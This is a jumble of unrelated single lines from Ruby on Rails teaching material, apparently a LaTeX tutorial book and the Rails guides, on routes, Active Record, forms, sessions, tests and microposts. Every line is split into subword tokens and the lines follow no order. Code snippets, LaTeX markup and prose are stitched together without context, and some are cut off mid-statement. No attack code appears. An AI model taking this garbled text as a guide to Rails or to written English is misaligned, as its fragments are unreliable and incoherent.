▁App Name :: Application ▖ config ▖ session _ store ▁: cookie _ store , ▁key : ▁' S O M E T H IN G N E W '
▁To ▁avoid ▁ clu tt er ing ▁the ▁templates ▁with ▁ bo ile r plat e ▁code , ▁a ▁number ▁of ▁helper ▁classes ▁provide ▁common ▁behavior ▁for ▁forms , ▁date s , ▁and ▁strings ▖
▁| ▁GET ▁| ▁ / photos / : id / edit ▁| ▁images # edit ▁| ▁edit _ photo _ path (: id ) ▁|
▁The ▁page ▁is ▁identical ▁to ▁Figure ~\ ref { fig : hello _ world _ first _ app }, ▁but ▁now ▁it ' s ▁running ▁in ▁a ▁production ▁environment ▁on ▁the ▁live ▁web .
▁RESTful ▁routes ▁provided ▁by ▁the ▁Microposts ▁resource ▁in ▁Listing ~\ ref { code : demo _ microposts _ resource } .
▁Active ▁Support ▁extend s ▁ s li c ing ▁to ▁hashes :
▁Because ▁of ▁the ▁way ▁Ruby ▁handle s ▁assignment s ▁inside ▁objects , ▁without ▁\ k ode { self } ▁the ▁assignment ▁would ▁create ▁a ▁\ emph { local } ▁variable ▁called ▁\ k ode { remember \_ token }, ▁which ▁isn ' t ▁what ▁we ▁want ▁at ▁all .
▁E mail ▁clients ▁have ▁no ▁web ▁context ▁and ▁so ▁paths ▁have ▁no ▁base ▁URL ▁to ▁form ▁complete ╼ web ▁addresses ▖
▁ Form ▁With ▁ Error s ]( images / getting _ started / form _ with _ errors ▖ png )
▁If ▁the ▁index ▁is ▁ greater ▁than ▁the ▁length ▁of ▁the ▁array , ▁it ▁returns ▁an ▁empty ▁array .
▁If ▁we ▁want ▁to ▁display ▁the ▁ properties ▁of ▁all ▁the ▁ books ▁in ▁our ▁view , ▁we ▁can ▁do ▁so ▁with ▁an ▁ ERB ▁template ▁like ▁this :
▁def ▁full _ messages
▁includes ▁the ▁ en close d ▁line ▁only ▁if ▁the ▁version ▁of ▁M ic r o s of t ▁ Internet ▁E x p l or er ~ ( IE ) ▁is ▁less ▁than ~ 9 ▁(\ k ode { if ▁ lt ▁ IE ▁ 9 }) .
▁This ▁is ▁necessary ▁because ▁there ▁is ▁no ▁way ▁for ▁a ▁browser ▁to ▁visit ▁the ▁\ k ode { update } ▁action ▁directly --- it ▁can ▁only ▁get ▁there ▁in d ir ec t ly ▁by ▁ submitting ▁the ▁edit ▁form --- so ▁Capybara ▁can ' t ▁do ▁it ▁either .
▁( In ▁this ▁context , ▁I ▁recommend ▁tak ing ▁a ▁look ▁at ▁\ href { http :// r ailscasts ▖ com / episodes / 27 5 - how - i - test } { the ▁ RailsCast ▁on ▁`` H o w ▁I ▁test '' } .
▁E x ist ing ▁signed ▁cookies ▁generated ▁with ▁Rails ▁3 ▖ x ▁will ▁be ▁ tr an s parent ly ▁upgrade d ▁if ▁you ▁leave ▁your ▁existing ▁` secret _ token ` ▁in ▁place ▁and ▁add ▁the ▁new ▁` secret _ key _ base ` .
▁All ▁of ▁them ▁accept ▁the ▁`: on ` ▁and ▁`: message ` ▁options , ▁which ▁define ▁when ▁the ╼ validation ▁should ▁be ▁run ▁and ▁what ▁message ▁should ▁be ▁added ▁to ▁the ▁` errors `╼ collection ▁if ▁it ▁fails , ▁respectively ▖
▁We ▁then ▁make ▁50 ▁microposts ▁for ▁each ▁user ▁( p l ent y ▁to ▁ overflow ▁the ▁pagination ▁ limit ▁of ~ 30 ), ▁ generating ▁sample ▁content ▁for ▁each ▁micropost ▁using ▁the ▁ Faker ▁gem ' s ▁hand y ▁\ href { http :// ruby doc ▖ info / gem s / fa k er /1 ▖ 3▖0 / Faker / Lorem }{\ text tt { Lorem ▖ sentence } ▁method } .
▁The ▁User ▁data ▁model ▁with ▁an ▁added ▁\ k ode { password \_ digest } ▁attribute .
▁One ▁of ▁the ▁results ▁of ▁the ▁\ k ode { generate } ▁command ▁in ▁Listing ~\ ref { code : generate _ user _ model } ▁is ▁a ▁new ▁file ▁called ▁a ▁\ emph { migration } .
▁#### ▁` in _ groups ( number , ▁fill _ with ▁= ▁nil ) `
▁Also ▁check ▁your ▁environment ▁settings ▁for ▁` config ▖ action _ dispatch ▖ b est _ standard s _ support ` ▁and ▁remove ▁it ▁if ▁present .
▁A ▁user ▁profile ▁with ▁an ▁ unfollow ▁button ▁(\ href { http :// localhost :3000/ users / 8 }{/ users / 6 }) ▖ ~\ href { http :// railstutorial ▖ org / images / figures / profile _ unfollow _ button _ bootstrap - full ▖ png }{( full ▁size )}
▁Rails ▁also ▁creates ▁a ▁default ▁` app / assets / stylesheets / application ▖ css ` ▁file ╼ which ▁contains ▁these ▁lines :
▁As ▁noted , ▁\ k ode {@ user ▖ microposts ▖ count } ▁is ▁the ▁an a log ue ▁of ▁the ▁\ k ode { User ▖ count } ▁method , ▁except ▁that ▁it ▁count s ▁the ▁microposts ▁ belonging ▁to ▁a ▁given ▁user ▁through ▁the ▁user / micropost ▁association .
▁# ▁Generate ▁a ▁new ▁token ▁and ▁store ▁it ▁in ▁token _ file .
▁#### ▁ Example s ▁from ▁the ▁Under gr ound
▁# ▁=> ▁ActiveRecord :: RecordNotFound
▁As ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : email _ in _ production }, ▁account ▁activation ▁and ▁password ▁reset ▁include ▁some ▁common ▁email ▁configuration , ▁which ▁we ' ll ▁want ▁to ▁apply ▁to ▁both ▁features ▁before ▁m er g ing ▁to ▁master .
▁WHERE ▁ follower _ id ▁= ▁: user _ id "
▁( The ▁\ k ode { - e } ▁here ▁arrange s ▁to ▁run ▁just ▁the ▁examples ▁who se ▁ description ▁strings ▁match ▁\ k ode {" signup ▁page "} .
▁Fin ally , ▁routes ▁will ▁also ▁be ▁ isolate d ▁within ▁the ▁engine ▖
▁### ▁P ess im ist ic ▁ Lock ing
▁#### ▁ radio _ button _ tag
▁request ▖ remote _ ip ) ▁ }
▁Note ▁that ▁you ▁will ▁\ emph { not } ▁receive ▁an ▁actual ▁email ▁in ▁a ▁development ▁environment , ▁but ▁it ▁will ▁show ▁up ▁in ▁your ▁server ▁log s .
▁The ▁\ k ode { update } ▁action ▁needed ▁to ▁get ▁the ▁tests ▁in ▁Listing ~\ ref { code : successful _ edit _ test } ▁to ▁pass ▁is ▁similar ▁to ▁the ▁final ▁form ▁of ▁the ▁\ k ode { create } ▁action ▁( Listing ~\ ref { code : login _ upon _ signup }), ▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ update _ action } .
▁We ' ve ▁covered ▁a ▁lot ▁of ▁ gr ound ▁in ▁this ▁chapter , ▁ transform ing ▁our ▁pro mis ing ▁but ▁un form ed ▁application ▁into ▁a ▁site ▁cap able ▁of ▁the ▁full ▁suite ▁of ▁ registration ▁and ▁login ▁behavior s .
▁### ▁Specif y ing ▁ Constraint s
▁def ▁run
▁This ▁is ▁a ▁Ruby ▁convention ▁indicat ing ▁that ▁the ▁return ▁value ▁is ▁\ emph { boolean } : ▁\ k ode { true } ▁or ▁\ k ode { false } .
▁### ▁Specif y ing ▁a ▁Controller ▁to ▁Use
▁It ▁take s ▁as ▁arguments ▁the ▁text ▁of ▁the ▁link ▁and ▁an ▁optional ▁\ k ode { : href } ▁parameter , ▁so ▁that
▁The ▁match er ▁ assigns ▁segment s ▁to ▁parameters ▁in ▁an ▁in t u i tive ▁way ▖
▁# ▁Re d ir ec t s ▁to ▁store d ▁location ▁( or ▁to ▁the ▁default ) .
▁path _ suffix ▁= ▁ qualified _ name ▖ underscore
▁With ▁that , ▁our ▁layout ▁has ▁links ▁to ▁all ▁the ▁static ▁pages ▁created ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁so ▁that , ▁for ▁example , ▁\ href { http :// localhost :3000/ about }{/ about } ▁go es ▁to ▁the ▁About ▁page ▁( Figure ~\ ref { fig : about _ page }) .
▁As ▁you ▁m ight ▁guess , ▁the ▁files ▁allow ▁us ▁to ▁mix ▁JavaScript ▁and ▁ Embedded ▁Ruby ▁to ▁perform ▁actions ▁on ▁the ▁current ▁page .
▁foreign _ key : ▁" manager _ id "
▁As ▁we ▁proceed , ▁it ▁may ▁help ▁to ▁refer ▁to ▁Table ~\ ref { table : user _ url s }, ▁which ▁shows ▁the ▁correspond ence ▁between ▁pages ▁and ▁URLs .
▁### ▁Active ▁Record
▁ Go ╼ a head ▁and ▁run ▁the ▁migration :
▁No ▁big ▁deal , ▁but ▁not ▁clean ▁either .
▁For ▁example , ▁here ' s ▁a ▁small ▁section ▁of ▁the ▁` rake ▁routes ` ▁output ▁for ▁a ▁RESTful ▁route :
▁These ▁tests ▁introduce ▁( via ▁the ▁RSpec ▁boolean ▁convention ) ▁the ▁array ▁\ k ode { include ?}\ ▁method , ▁which ▁simply ▁check s ▁if ▁an ▁array ▁includes ▁the ▁given ▁element
▁ umerate }╼╼ ▁% ▁subsection ▁ unsuccessful _ edit s ▁( end )╼╼ ▁\ subsection { Test ing ▁ unsuccessful ▁edit s } ▁% ▁( fold )╼ ▁\ label { sec : testing _ unsuccessful _ edit s }╼╼
▁Change ▁`: user name ` ▁in ▁the ▁route ▁definition ▁if ▁you ▁do ▁not ▁want ▁your ▁parameter ▁name ▁to ▁be ▁`: user name ` .
▁It ' s ▁not ▁necessary ▁to ▁understand ▁the ▁results ▁in ▁detail , ▁but ▁view ing ▁the ▁routes ▁in ▁this ▁ man n er ▁gives ▁us ▁a ▁high - level ▁ overview ▁of ▁the ▁actions ▁supported ▁by ▁our ▁application .
▁ Lock ing ▁Record s ▁for ▁ Update
▁#### # ▁` order `
▁By ▁refer r ing ▁to ▁the ▁methods ▁in ▁Table ~\ ref { table : association _ methods _ relationships }, ▁we ▁can ▁write ▁the ▁\ k ode { follow }, ▁\ k ode { unfollow }, ▁and ▁\ k ode { following ?}\ ▁methods ▁using ▁the ▁association ▁with ▁\ k ode { following }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : follow _ unfollow _ following } .
▁#### ▁` parent s `
▁The ▁\ k ode { create \_ table } ▁method ▁accept s ▁a ▁block ▁( Section ~\ ref { sec : block s }) ▁with ▁one ▁block ▁variable , ▁in ▁this ▁case ▁called ▁\ k ode { t } ▁( for ▁`` table '') .
▁* ▁ Fi lt ers ▁can ▁be ▁specified ▁with ▁a ▁block ▁or ▁a ▁symbol ▁to ▁a ▁method ▁in ▁the ▁mailer ╼ ▁class ▁similar ▁to ▁controllers .
▁git ▁commit : ▁% Q { ▁- m ▁' Initial ▁commit ' ▁ }
▁# ▁</ contributors >
▁The ▁email ▁will ▁automatically ▁be ▁available ▁in ▁the ▁\ k ode { edit } ▁action ▁because ▁of ▁its ▁presence ▁in ▁the ▁link ▁above , ▁but ▁after ▁we ▁submit ▁the ▁form ▁its ▁value ▁will ▁be ▁ lo st .
▁Return s ▁an ▁input ▁tag ▁of ▁the ▁" email " ▁type ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁S ublime ▁Text ▁can ▁be ▁obtain ed ▁ com m er cial ly , ▁whereas ▁ V im ▁can ▁be ▁obtain ed ▁at ▁no ▁ cost ; ▁both ▁are ▁in d us t ri al - strength ▁editor s , ▁but ▁in ▁my ▁experience ▁S ublime ▁Text ▁is ▁\ emph { much } ▁more ▁ accessible ▁to ▁beginners .
▁The ▁first ▁parameter ▁of ▁` form _ for ` ▁can ▁be ▁an ▁object , ▁say , ▁`@ article ` ▁which ▁would ╼ c a use ▁the ▁helper ▁to ▁fill ▁in ▁the ▁form ▁with ▁the ▁fields ▁of ▁the ▁object ▖
▁=> ▁" H ar t l "
▁module ▁Fix t ure File Helpers
▁For ▁example , ▁an ▁HTML ▁file ▁using ▁the ▁ ERB ▁template ▁system ▁will ▁have ▁` ▖ html ▖ erb ` ▁as ▁a ▁file ▁extension .
▁We ▁then ▁fill ▁it ▁with ▁the ▁contents ▁show n ▁in ▁Listing ~\ ref { code : sample _ app _ readme } .
▁If ▁it ' s ▁been ▁over ▁a ▁ week , ▁and ▁you ▁have n ' t ▁he ar d ▁anything , ▁you ▁m ight ▁want ▁to ▁try ╼ and ▁ n u d ge ▁things ▁along ▖
▁The ▁` config / database ▖ yml ` ▁file ▁contains ▁section s ▁for ▁three ▁different ▁ environments ▁in ▁which ▁Rails ▁can ▁run ▁by ▁default :
▁T y p ical ly ▁a ▁string ▁or ▁symbol ▖
▁We ' ll ▁start ▁by ▁giv ing ▁users ▁the ▁ability ▁to ▁update ▁their ▁profile s , ▁which ▁will ▁also ▁provide ▁a ▁natural ▁opportunit y ▁to ▁enforce ▁an ▁ authorization ▁model ▁( ma de ▁possible ▁by ▁the ▁authentication ▁code ▁in ▁Chapter ~\ ref { cha : log _ in _ log _ out }) .
▁Client ▖ maximum (" age ")
▁The ▁` stylesheet _ link _ tag ` ▁helper ▁returns ▁an ▁HTML ▁`< link >` ▁tag ▁for ▁each ▁source ▁provided .
▁In ▁this ▁section , ▁we ' ll ▁add ▁the ▁\ href { http :// www ▖ answer s ▖ com / p en ultimate } { p en ultimate } ▁user ▁action , ▁the ▁\ k ode { index } ▁action , ▁which ▁is ▁design ed ▁to ▁display ▁\ emph { all } ▁the ▁users ▁instead ▁of ▁just ▁one .
▁* ▁What ▁Object ▁ Relation al ▁M app ing ▁and ▁Active ▁Record ▁are ▁and ▁how ▁they ▁are ▁used ▁in ╼ ▁Rails .
▁More over , ▁since ▁we ' ll ▁be ▁using ▁email ▁addresses ▁as ▁unique ▁user name s ▁when ▁users ▁sign ▁in , ▁we ▁should n ' t ▁allow ▁email ▁duplicate s ▁in ▁the ▁database .
▁We ▁can ▁get ▁these ▁tests ▁to ▁pass ▁by ▁running ▁the ▁microposts ▁migration ▁and ▁prepar ing ▁the ▁test ▁database :
▁create _ table ▁: ph y s ic i an s ▁do ▁| t |
▁ Local ▁ com p i l ation ▁allows ▁you ▁to ▁commit ▁the ▁ compiled ▁files ▁into ▁source ▁control ,╼ and ▁deploy ▁as ▁normal .
▁Doe s ▁the ▁same ▁as ▁` collection ▖ create `, ▁but ▁raise s ▁` ActiveRecord :: RecordInvalid ` ▁if ▁the ▁record ▁is ▁invalid .
▁### ▁Work ing ▁with ▁Ke y s
▁--------- ---------------- -
▁Note ▁that ▁the ▁final ▁two ▁expression s ▁are ▁equivalent , ▁but ▁I ▁prefer ▁the ▁ interpolate d ▁version ; ▁ having ▁to ▁add ▁the ▁single ▁ space ▁\ k ode {" ~ "} ▁seem s ▁a ▁bit ▁a w k ward .
▁with ▁the ▁equivalent
▁The ▁user ▁show ▁view ▁with ▁name ▁and ▁Gravatar .
▁" Time " ▁=> ▁" datetime "
▁WARNING ▖ ▁Ke y s ▁should ▁normal ly ▁be ▁unique ▖
▁( Re ad ers ▁ familiar ▁with ▁Rails ~ 2▖ x ▁should ▁note ▁that ▁\ k ode { form \_ for } ▁uses ▁the ▁`` p er c ent - equal s '' ▁ ERb ▁syntax ▁for ▁insert ing ▁content ;
▁This ▁is ▁the ▁" C " ▁and ▁the ▁" R " ▁from ▁ CRUD : ╼ c re ation ▁and ▁reading ▖
▁[ ` form _ for ` ]( http :// api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / Form Helper ▖ html # method - i - form _ for )╼ is ▁a ▁helper ▁that ▁as s ist s ▁with ▁writing ▁forms ▖
▁As ▁with ▁the ▁first ▁application , ▁I ▁suggest ▁updating ▁the ▁\ k ode { README } ▁file ▁( lo cat ed ▁in ▁the ▁root ▁directory ▁of ▁the ▁application ) ▁to ▁be ▁more ▁helpful ▁and ▁ de script ive .
▁Listing ~\ ref { code : valid _ user _ test } ▁uses ▁the ▁plain ▁\ k ode { assert } ▁method , ▁which ▁in ▁this ▁case ▁succeed s ▁if ▁\ k ode {@ user ▖ valid ?} ▁returns ▁\ k ode { true } ▁and ▁fails ▁if ▁it ▁returns ▁\ k ode { false } .
▁#### ▁javascript _ tag
▁ silence _ warning s ▁ { ▁Object ▖ const _ set ▁" RAILS _ D E F A U L T _ LO G G ER ", ▁ logger ▁ }
▁ _ ▁For ▁example ▁when ▁you ▁display ▁the ▁user ▁a g ent ▁in ▁an ▁admin ist r ation ▁are a .
▁( A t ▁this ▁point , ▁I ▁also ▁recommend ▁remov ing ▁the ▁\ k ode { hello } ▁action ▁from ▁the ▁Application ▁controller ▁if ▁you ▁added ▁it ▁in ▁Section ~\ ref { sec : sample _ app _ setup } ▖)
▁length : ▁ { ▁ minimum : ▁5 ▁ }
▁The ▁ jQuery ▁library ▁( which ▁we ▁saw ▁brief ly ▁in ▁Section ~\ ref { sec : image _ validation }) ▁provides ▁a ▁large ▁number ▁of ▁methods ▁for ▁ manipulati n g ▁the ▁ DOM , ▁but ▁here ▁we ▁will ▁need ▁only ▁two .
▁I ▁particular ly ▁recommend ▁ installing ▁\ href { http :// n ode js ▖ org /}{ N ode ▖ js } ▖)
▁The ▁view ▁should ▁just ▁display ▁that ▁information ▖╼
▁General ▁A d v ice
▁As ▁usual , ▁we ' ll ▁make ▁a ▁topic ▁branch ▁for ▁the ▁new ▁feature .
▁d ▖ monday ▁# ▁=> ▁Mon , ▁0 3 ▁May ▁2010
▁User ▖ where ( id : ▁1) ▖ joins (: articles )▖ explain
▁| ▁GET ▁| ▁ / photos / new ▁| ▁photos # new ▁| ▁return ▁an ▁HTML ▁form ▁for ▁creating ▁a ▁new ▁ photo ▁|
▁real 	 0 m 2▖ 64 9 s
▁When ▁this ▁option ▁is ▁true , ▁digest s ▁will ▁be ▁generated ▁for ▁asset ▁URLs .
▁Here ▁the ▁\ k ode { : page } ▁parameter ▁comes ▁from ▁\ k ode { params [: page ]} , ▁which ▁is ▁generated ▁automatically ▁by ▁\ k ode { will \_ paginate } .
▁As ▁with ▁model ▁inheritance , ▁by ▁inherit ing ▁ ultimate ly ▁from ▁\ k ode { ActionController :: Base } ▁both ▁the ▁Users ▁and ▁Microposts ▁controllers ▁gain ▁a ▁large ▁amount ▁of ▁functionality , ▁such ▁as ▁the ▁ability ▁to ▁manipulate ▁model ▁objects , ▁filter ▁in b ound ▁HTTP ▁requests , ▁and ▁render ▁views ▁as ▁HTML .
▁One ▁can ▁use ▁the ▁` ActionView :: render ` ▁method ▁via ▁` render ▁template : ▁' layouts / new s ' ` ▁to ▁base ▁a ▁new ▁layout ▁on ▁the ▁ New s ▁layout ▖
▁ 123 ▖ to _ s (: human _ size ) ▁# ▁=> ▁ 123 ▁By te s
▁def ▁ attr _ internal _ reader (* attr s )
▁# ▁instance ▁variable .
▁WARNING : ▁If ▁you ' re ▁pre compiling ▁your ▁assets ▁( see ▁[ In ▁ Product ion ](# in - production )╼ be low ), ▁link ing ▁to ▁an ▁asset ▁that ▁does ▁not ▁exist ▁will ▁raise ▁an ▁exception ▁in ▁the ╼ call ing ▁page ▖
▁ Compar ing ▁Listing ~\ ref { code : demo _ user _ class } ▁and ▁Listing ~\ ref { code : demo _ micropost _ class }, ▁we ▁see ▁that ▁both ▁the ▁User ▁model ▁and ▁the ▁Micropost ▁model ▁inherit ▁( via ▁the ▁left ▁an g le ▁bracket ~\ k ode { < }) ▁from ▁\ k ode { ActiveRecord :: Base }, ▁which ▁is ▁the ▁base ▁class ▁for ▁models ▁provided ▁by ▁ActiveRecord ; ▁a ▁diagram ▁summariz ing ▁this ▁relationship ▁appears ▁in ▁Figure ~\ ref { fig : demo _ model _ inheritance } .
▁T a k en ▁together , ▁the ▁material ▁in ▁Chapter ~\ ref { cha : modeling _ users } ▁through ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users } ▁develop s ▁a ▁full ▁Rails ▁login ▁and ▁authentication ▁system .
▁( The ▁other ▁main ▁possibilities ▁list ed ▁in ▁the ▁\ href { https :// github ▖ com / carrierwave uploader / carrierwave # using - mini magic k } { CarrierWave ▁documentation ▁on ▁ MiniMagick } ▁\ emph { st re t ch } ▁images ▁if ▁they ' re ▁too ▁small , ▁which ▁isn ' t ▁what ▁we ▁want ▁in ▁this ▁case ▖)
▁If ▁you ▁like , ▁you ▁can ▁verify ▁that ▁the ▁form ▁show n ▁in ▁Figure ~\ ref { fig : home _ with _ form } ▁is ▁working ▁by ▁ submitting ▁a ▁valid ▁entry ▁and ▁then ▁ nav ig ating ▁to ▁the ▁\ href { http :// localhost :3000/ users /1 } { profile ▁page } ▁to ▁see ▁the ▁post , ▁but ▁that ' s ▁rather ▁cumbersome .
▁A ▁route ▁for ▁the ▁signup ▁page .
▁* ▁If ▁` value ` ▁is ▁a ▁hash ▁there ' s ▁a ▁ recursive ▁call ▁with ▁` key ` ▁as ▁`: root ` .
▁We ▁can ▁do ▁this ▁using ▁the ▁\ k ode { respond \_ to } ▁method , ▁respond ing ▁appropriate ly ▁depending ▁on ▁the ▁type ▁of ▁request ▖ ▁The ▁general ▁pattern ▁look s ▁like ▁this :
▁def ▁process ( action , ▁params = nil , ▁session = nil , ▁flash = nil , ▁ http _ method =' GET ')
▁first _ name : ▁' Andy ')
▁< h 2 > Comments </ h 2 >
▁< title > Welcome !
▁P age ▁2 ▁of ▁the ▁users ▁index .
▁This ▁load s ▁arbitrar y ▁HTML ▁and / or ▁JavaScript ▁from ▁an ▁external ▁source ▁and ▁e mb ed s ▁it ▁as ▁part ▁of ▁the ▁site ▖
▁The ▁ predicate ▁` utc ?` ▁say s ▁whether ▁the ▁receiver ▁has ▁UTC ▁as ▁its ▁time ▁ zone :
▁The ▁\ k ode { update \_ attributes } ▁method ▁is ▁an ▁alias ▁for ▁the ▁short er ▁\ k ode { update } ▁method , ▁but ▁I ▁prefer ▁the ▁longer ▁version ▁because ▁of ▁its ▁similar ity ▁to ▁the ▁ singular ▁version ▁of ▁the ▁method , ▁\ k ode { update \_ attribute } .
▁S w it ch ▁to
▁If ▁you ▁don ' t ▁need ▁to ▁do ▁anything ▁with ▁the ▁relationship ▁model , ▁it ▁may ▁be ▁simple r ▁to ▁set ▁up ▁a ▁` has _ and _ belongs _ to _ many ` ▁relationship ▁( t hough ▁you ' ll ▁need ▁to ▁remember ▁to ▁create ▁the ▁join ing ▁table ▁in ▁the ▁database ) .
▁HTTP /1▖1 ▁200 ▁OK ▁ Server : ▁Co w bo y
▁So , ▁for ▁example , ▁page ~ 1 ▁is ▁users ▁1 - - 30 , ▁page ~ 2 ▁is ▁users ▁31 - - 60 , ▁etc ▖ ▁If ▁the ▁page ▁is ▁\ k ode { nil }, ▁\ k ode { paginate } ▁simply ▁returns ▁the ▁first ▁page .
▁The ▁ XML ▁serializ er ▁of ▁models ▁uses ▁this ▁method ▁to ▁ dasherize ▁ n ode ▁names :
▁The ▁` config / database ▖ yml ` ▁file ▁can ▁contain ▁ ERB ▁tags ▁` <%= ▁%> ` ▖
▁Figure ~\ ref { fig : user _ profile _ with _ microposts } ▁shows ▁the ▁user ▁profile ▁page ▁for ▁the ▁first ▁user , ▁while ▁Figure ~\ ref { fig : other _ profile _ with _ microposts } ▁shows ▁the ▁profile ▁for ▁a ▁second ▁user .
▁\ href { http :// www ▖ got ealeaf ▖ com / railstutorial } { T ealeaf ▁A c a de my } : ▁L o t s ▁of ▁in - person ▁developer ▁b oo t c amp s ▁have ▁ s p run g ▁up ▁in ▁ recent ▁ years , ▁and ▁I ▁recommend ▁look ing ▁for ▁one ▁in ▁your ▁are a , ▁but ▁\ href { http :// www ▖ got ealeaf ▖ com / railstutorial } { T ealeaf ▁A c a de my } ▁is ▁available ▁online ▁and ▁so ▁can ▁be ▁taken ▁from ▁any where .
▁Of ▁course , ▁after ▁this ▁minor ▁refactoring ▁the ▁test ▁suite ▁should ▁ still ▁be ▁\ passing :
▁But ▁be ▁ w ar n ed : ▁there ' s ▁a ▁\ emph { ma j or } ▁c a ve at , ▁so ▁don ' t ▁just ▁ s k im ▁this ▁section --- read ▁it ▁careful ly .
▁C : \ Site s \ sample _ app
▁in ▁Listing ~\ ref { code : generated _ account _ activation _ view _ text } ▁and
▁If ▁there ▁are ▁no ▁ associated ▁objects , ▁it ▁returns ▁an ▁empty ▁array .
▁In ▁that ▁case , ▁we ▁used ▁a ▁\ k ode { before \_ save } ▁callback ▁combine d ▁with ▁the ▁\ k ode { downcase } ▁method ▁( Listing ~\ ref { code : email _ downcase }) .
▁#### ▁ Copy ing
▁** ▁`: table _ name ` ▁would ▁make ▁the ▁primary ▁key ▁for ▁the ▁ Customer ▁class ▁` customer id `
▁# ▁=> ▁false
▁ V a ri able s ▁that ▁start ▁with ▁the ▁\ k ode {@ } ~ sign , ▁called ▁\ emph { instance ▁variables }, ▁are ▁automatically ▁available ▁in ▁the ▁views ; ▁in ▁this ▁case , ▁the ▁\ k ode { index ▖ html ▖ erb } ▁view ▁in ▁Listing ~\ ref { code : demo _ index _ view } ▁iterate s ▁through ▁the ▁\ k ode {@ users } ▁list ▁and ▁output s ▁a ▁line ▁of ▁HTML ▁for ▁each ▁one .
▁This ▁uses ▁the ▁Rails ▁convention ▁of ▁\ k ode { id : ▁@ user }, ▁which ▁( as ▁in ▁controller ▁redirect s ) ▁automatically ▁uses ▁\ k ode {@ user ▖ id } .
▁getting _ users ▁( end )╼╼ \ subsection { T w o ▁ subtle ▁bug s } ▁% ▁( fold )╼\ label { sec : two _ subtle _ b ug s }╼╼
▁We ' ll ▁start ▁by ▁ generating ▁an ▁integration ▁test ▁for ▁the ▁profile s ▁of ▁our ▁site ' s ▁users :
▁form _ for ▁@ geocoder , ▁url : ▁ geocoder _ path ▁do ▁| f |
▁The ▁above ▁discussion ▁implie s ▁that ▁we ▁will ▁be ▁adding ▁a ▁\ emph { second } ▁occur r ence ▁of ▁\ k ode { user \_ id } ▁in ▁the ▁SQL ▁query .
▁If ▁you ▁are ▁using ▁M ac ▁OS ▁X ▁or ▁Windows , ▁you ▁have ▁a ▁JavaScript ▁run time ▁installed ▁in ╼ your ▁operat ing ▁system ▖
▁resources ▁: articles
▁There ▁are ▁many ▁ mostly ▁equivalent ▁possibilities --- essentially , ▁any ▁large ▁random ▁string ▁will ▁do ▁just ▁fine , ▁as ▁long ▁as ▁it ' s ▁unique .
▁ / / ]] >
▁A lthough ▁it ▁should ▁be ▁used ▁with ▁caution , ▁the ▁flexibility ▁to ▁add ▁methods ▁to ▁built - in ▁classes ▁allows ▁for ▁extra or dinarily ▁natural ▁addition s ▁to ▁plain ▁Ruby .
▁For ▁our ▁application ' s ▁design ▁choice , ▁which ▁involve s ▁\ emph { persistent } ▁sessions --- that ▁is , ▁signin ▁status ▁that ▁last s ▁even ▁after ▁browser ▁close --- we ▁need ▁to ▁use ▁a ▁\ emph { permanent } ▁identifie r ▁for ▁the ▁signed - in ▁user .
▁ Q u it ▁the ▁console .
▁In ▁the ▁case ▁of ▁the ▁user ▁we ▁just ▁created , ▁we ▁can ▁try ▁a ▁couple ▁of ▁invalid ▁passwords ▁as ▁follows :
▁#### ▁ Local ▁ V a ri able s
▁<%= ▁render ▁partial : ▁" product ", ▁object : ▁@ item ▁%>
▁| ▁1 ▁| ▁ SIMPLE ▁| ▁users ▁| ▁ const ▁| ▁PR IM A RY ▁|
▁The ▁Rails ▁routes , ▁with ▁a ▁new ▁rule ▁for ▁Microposts ▁resources .
▁When ▁a ▁test ▁is ▁es pecially ▁short ▁or ▁simple ▁compar ed ▁to ▁the ▁application ▁code ▁it ▁tests , ▁ le an ▁toward ▁writing ▁the ▁test ▁first .
▁The ▁results ▁appear ▁in ▁Listing ~\ ref { code : delete _ destroy _ test } .
▁See ▁if ▁you ▁can ▁ figure ▁out ▁why ▁we ' ve ▁added ▁a ▁new ▁test ▁instead ▁of ▁just ▁alter ing ▁the ▁current ▁one .
▁We ▁will ▁need ▁to ▁construct ▁some ▁microposts ▁in ▁the ▁User ▁model ▁test , ▁which ▁means ▁that ▁we ▁should ▁make ▁a ▁micropost ▁ factory ▁at ▁this ▁point .
▁ n >╼ \ end { enumerate } ╼╼% ▁subsection ▁profile _ micropost _ tests ▁( end )╼╼ ▁% ▁section ▁ showing _ microposts ▁( end )╼╼ ▁\ section { M an ip ul ating ▁microposts } ▁% ▁( fold )╼ ▁\ label { sec : manipulati n g _ microposts }╼╼
▁We ▁can ▁ visual ize ▁the ▁result ▁of ▁this ▁association ▁in ▁Figure ~\ ref { fig : micropost _ user _ association } .
▁You ▁should ▁verify ▁that ▁click ing ▁on ▁the ▁link ▁in ▁Figure ~\ ref { fig : demo _ destroy _ user } ▁destroy s ▁the ▁second ▁user , ▁yield ing ▁an ▁index ▁page ▁with ▁only ▁one ▁user .
▁Having ▁defined ▁the ▁relevant ▁controller ▁and ▁route , ▁now ▁we ' ll ▁fill ▁in ▁the ▁view ▁for ▁new ▁sessions , ▁i ▖ e ▖ , ▁the ▁login ▁form .
▁The ▁About ▁page ▁with ▁HTML ▁structure ▁removed ▖
▁As ▁in ▁Chapter ~\ ref { cha : beginning } ▁and ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁I ▁suggest ▁following ▁the ▁`` hello , ▁world !''
▁The ▁result ▁is ▁show n ▁in ▁Figure ~\ ref { fig : sample _ app _ universal } .
▁In ▁order ▁to ▁forward ▁users ▁to ▁their ▁intend ed ▁d est in ation , ▁we ▁need ▁to ▁store ▁the ▁location ▁of ▁the ▁request ed ▁page ▁some where , ▁and ▁then ▁redirect ▁to ▁that ▁location ▁instead ▁of ▁to ▁the ▁default .
▁We ' ve ▁also ▁included ▁a ▁call ▁to ▁\ k ode { assert \_ template } ▁to ▁check ▁that ▁a ▁failed ▁submission ▁re - render s ▁the ▁\ k ode { new } ▁action .
▁To ▁login ▁to ▁the ▁site , ▁just ▁follow ▁this ▁link : ▁<%= ▁@ url ▁%> .
▁Note ▁the ▁arguments ▁to ▁\ k ode { get } ▁and ▁\ k ode { patch } ▁involve ▁code ▁like
